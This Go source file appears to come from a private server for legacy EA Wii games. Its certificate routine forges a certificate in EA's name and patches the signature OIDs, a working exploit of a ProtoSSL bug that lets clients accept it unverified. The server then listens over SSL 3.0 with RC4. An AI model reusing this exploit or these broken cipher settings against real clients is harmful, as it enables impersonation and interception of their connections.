package server

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"log/slog"
	"math/big"
	"time"

	"github.com/runZeroInc/excrypto/crypto/rsa"
	"github.com/runZeroInc/excrypto/crypto/ssl3/tls"
	"github.com/runZeroInc/excrypto/crypto/x509"
	"github.com/runZeroInc/excrypto/crypto/x509/pkix"
)

func GenerateProtoSSLCert(domain string) (tls.Certificate, error) {
	// Generate CA Private Key (1024-bit RSA)
	caPriv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate CA private key: %w", err)
	}

	// Hardcoded dates to ensure UTCTime (pre-2050)
	notBefore := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
	notAfter := time.Date(2049, 12, 31, 23, 59, 59, 0, time.UTC)

	// Create CA Certificate Template
	caTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Country:            []string{"US"},
			Province:           []string{"California"},
			Locality:           []string{"Redwood City"},
			Organization:       []string{"Electronic Arts, Inc."},
			OrganizationalUnit: []string{"Online Technology Group"},
			CommonName:         "OTG3 Certificate Authority",
		},
		NotBefore:             notBefore,
		NotAfter:              notAfter,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
		SignatureAlgorithm:    x509.MD5WithRSA,
	}

	// Self-sign CA Certificate (Use SHA1 for signing because MD5 is not supported in x509.CreateCertificate)
	// Will be hex-hacked later to MD5
	caTemplate.SignatureAlgorithm = x509.SHA1WithRSA
	caDER, err := x509.CreateCertificate(rand.Reader, caTemplate, caTemplate, &caPriv.PublicKey, caPriv)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create CA certificate: %w", err)
	}

	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to parse CA certificate: %w", err)
	}

	// Generate Server Private Key (1024-bit RSA)
	serverPriv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to generate server private key: %w", err)
	}

	// Create Server Certificate Template
	serverTemplate := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject: pkix.Name{
			Country:            []string{"US"},
			Province:           []string{"California"},
			Organization:       []string{"Electronic Arts, Inc."},
			OrganizationalUnit: []string{"Global Online Studio"},
			CommonName:         domain,
		},
		NotBefore:          notBefore,
		NotAfter:           notAfter,
		KeyUsage:           x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:        []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		SignatureAlgorithm: x509.SHA1WithRSA,
	}

	// Sign Server Certificate with CA
	serverDER, err := x509.CreateCertificate(rand.Reader, serverTemplate, caCert, &serverPriv.PublicKey, caPriv)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("failed to create server certificate: %w", err)
	}

	// We signed with SHA1, now we convert the first SHA1 OID to MD5
	sha1OID := []byte{0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05}
	md5OID := []byte{0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x04}

	firstIdx := bytes.Index(serverDER, sha1OID)
	if firstIdx == -1 {
		return tls.Certificate{}, fmt.Errorf("sha1WithRSA OID not found in certificate")
	}

	hackedDER := make([]byte, len(serverDER))
	copy(hackedDER, serverDER)
	copy(hackedDER[firstIdx:], md5OID)

	// Now we need to exploit the ProtoSSL Bug (https://github.com/Aim4kill/Bug_OldProtoSSL)
	// by converting the second occurrence of SHA1 OID to RSA Encryption OID to bypass signature verification
	secondIdx := bytes.Index(hackedDER[firstIdx+len(md5OID):], sha1OID)
	if secondIdx == -1 {
		return tls.Certificate{}, fmt.Errorf("second occurrence of sha1WithRSA OID not found in certificate")
	}

	targetIdx := firstIdx + len(md5OID) + secondIdx
	copy(hackedDER[targetIdx:], []byte{0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01})

	return tls.Certificate{
		Certificate: [][]byte{hackedDER},
		PrivateKey:  serverPriv,
	}, nil
}

func StartSSLServer(port string) {
	cert, err := GenerateProtoSSLCert("wiimoh08.ea.com")
	if err != nil {
		slog.Error("Could not generate ProtoSSL certificate", "err", err)
		return
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MaxVersion:   tls.VersionSSL30,
		MinVersion:   tls.VersionSSL30,
		CipherSuites: []uint16{
			tls.TLS_RSA_WITH_RC4_128_SHA,
			tls.TLS_RSA_WITH_RC4_128_MD5,
		},
		InsecureSkipVerify: true,
	}

	ln, err := tls.Listen("tcp", "localhost:"+port, config)
	if err != nil {
		slog.Error("Could not start SSL server", "port", port, "err", err)
		return
	}

	slog.Info("SSL server listening", "addr", ln.Addr())

	for {
		conn, err := ln.Accept()
		if err != nil {
			slog.Error("Could not accept SSL connection", "err", err)
			continue
		}

		slog.Info("SSL connection accepted", "localAddr", ln.Addr(), "remoteAddr", conn.RemoteAddr())

		go handleConnection(conn)
	}
}
